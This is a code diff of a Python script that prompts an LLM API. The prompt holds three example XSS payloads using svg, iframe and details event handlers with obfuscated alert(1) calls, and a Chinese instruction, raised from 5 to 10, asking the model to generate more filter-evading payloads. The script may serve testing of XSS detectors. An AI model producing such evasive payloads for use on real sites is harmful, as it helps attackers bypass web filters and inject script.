@@ -16,7 +16,7 @@ response = client.chat.completions.create(
             "<svg/onload=setTimeout('ale'+'rt(1)',100)></svg>\n"
             "<iframe src=\"javascript: setTimeout('ale'+'rt(1)', 100)\"></iframe>\n"
             "<details open ontoggle=\"setTimeout(unescape('%61%6c%65%72%74(1)'), 100)\"></details>\n"
-            "請幫我再產生 5 個類似概念的對抗性 payload，"
+            "請幫我再產生 10 個類似概念的對抗性 payload，"
             "使用非 script 標籤觸發、使用 setTimeout 或類似手法組合 alert(1)，避免被靜態分詞器解析。"
             "每個 payload 請用一行表示，只需要輸出 payload，不要編號，不要額外說明"
         )}
